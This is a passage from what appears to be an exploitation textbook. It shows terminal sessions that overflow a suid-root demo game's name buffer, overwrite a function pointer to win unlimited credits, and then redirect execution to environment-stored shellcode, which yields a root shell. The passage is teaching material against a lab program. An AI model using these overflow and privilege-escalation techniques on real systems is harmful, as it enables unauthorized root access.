91pt;text-indent: 0pt;text-align: left;">[DEBUG] current_game pointer @ 0x08048fde</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">####### Pick a Number ######</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">This game costs 10 credits to play. Simply pick a number between 1 and 20, and if you pick the winning number, you will win the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">10 credits have been deducted from your account.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Pick a number between 1 and 20: The winning number is 15 Sorry, you didn&#39;t win.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 40 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Would you like to play again? (y/n) -=[ Game of Chance Menu ]=- 1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">[Name: Jon Erickson] [You have 40 credits] -&gt; Change user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Enter your new name: Your name has been changed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">-=[ Game of Chance Menu ]=-</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[You have 40 credits] -&gt;</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">[DEBUG] current_game pointer @ 0x08048d70</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You have won the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 140 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) -=[ Game of Chance Menu ]=- 1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">[You have 140 credits] -&gt; Thanks for playing! Bye. reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_482.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">After confirming that this method works, it can be expanded upon to gain any number of credits.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_483.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ perl -e &#39;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x70\ x8d\x04\x08\n&quot; . &quot;1\n&quot; . &quot;y\n&quot;x10 . &quot;n\n5\nJon Erickson\n7\n&quot;&#39; | ./ game_of_chance</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">-=[ Game of Chance Menu ]=-</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-top: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[You have 140 credits] -&gt;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[DEBUG] current_game pointer @ 0x08048fde</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">####### Pick a Number ######</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">This game costs 10 credits to play. Simply pick a number between 1 and 20, and if you pick the winning number, you will win the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">10 credits have been deducted from your account.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Pick a number between 1 and 20: The winning number is 1 Sorry, you didn&#39;t win.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 130 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Would you like to play again? (y/n) -=[ Game of Chance Menu ]=- 1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[You have 130 credits] -&gt; Change user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Enter your new name: Your name has been changed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">-=[ Game of Chance Menu ]=-</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[You have 130 credits] -&gt;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[DEBUG] current_game pointer @ 0x08048d70</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You have won the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 230 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) [DEBUG] current_game pointer @ 0x08048d70</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You have won the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 330 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) [DEBUG] current_game pointer @ 0x08048d70</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You have won the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 430 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) [DEBUG] current_game pointer @ 0x08048d70</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You have won the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 530 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) [DEBUG] current_game pointer @ 0x08048d70</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You have won the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 630 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) [DEBUG] current_game pointer @ 0x08048d70</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You have won the jackpot of 100 credits!</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 730 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) [DEBUG] current_game pointer @ 0x08048d70</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You have won the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 830 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) [DEBUG] current_game pointer @ 0x08048d70</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You have won the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 930 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) [DEBUG] current_game pointer @ 0x08048d70</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You have won the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 1030 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) [DEBUG] current_game pointer @ 0x08048d70</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You have won the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 1130 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) [DEBUG] current_game pointer @ 0x08048d70</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You have won the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 1230 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) -=[ Game of Chance Menu ]=- 1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-top: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[You have 1230 credits] -&gt; Change user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Enter your new name: Your name has been changed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">-=[ Game of Chance Menu ]=-</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">[Name: Jon Erickson]</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[You have 1230 credits] -&gt; Thanks for playing! Bye. reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_484.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">As you might have already noticed, this program also runs suid root. This means shellcode can be used to do a lot more than win free credits. As with the stack-based overflow, shellcode can be stashed in an environment variable. After building a suitable exploit buffer, the buffer is piped to the game_of_chance’s standard input. Notice the dash argument following the exploit buffer in the cat command. This tells the cat program to send standard input after the exploit buffer, returning control of the input. Even though the root shell doesn’t display its prompt, it is still accessible and still escalates privileges.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_485.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: justify;">reader@hacking:~/booksrc $ export SHELLCODE=$(cat ./shellcode.bin) reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./game_of_chance SHELLCODE will be at 0xbffff9e0</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ perl -e &#39;print &quot;1\n7\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xe0\ xf9\xff\xbf\n&quot; . &quot;1\n&quot;&#39; &gt; exploit_buffer</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ cat exploit_buffer - | ./game_of_chance</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">-=[ Game of Chance Menu ]=-</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[Name: Jon Erickson] [You have 70 credits] -&gt;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[DEBUG] current_game pointer @ 0x08048fde</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">####### Pick a Number ######</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">This game costs 10 credits to play. Simply pick a number between 1 and 20, and if you pick the winning number, you will win the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">10 credits have been deducted from your account.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Pick a number between 1 and 20: The winning number is 2 Sorry, you didn&#39;t win.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 60 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) -=[ Game of Chance Menu ]=- 1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[Name: Jon Erickson] [You have 60 credits] -&gt; Change user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Enter your new name: Your name has been changed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">-=[ Game of Chance Menu ]=-</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[You have 60 credits] -&gt;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[DEBUG] current_game pointer @ 0xbffff9e0</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">whoami root id</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">uid=0(root) gid=999(reader) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46( plugdev),104(scanner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(re ader)</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_486.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part61.htm">0x350 Format Strings</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part59.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part61.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
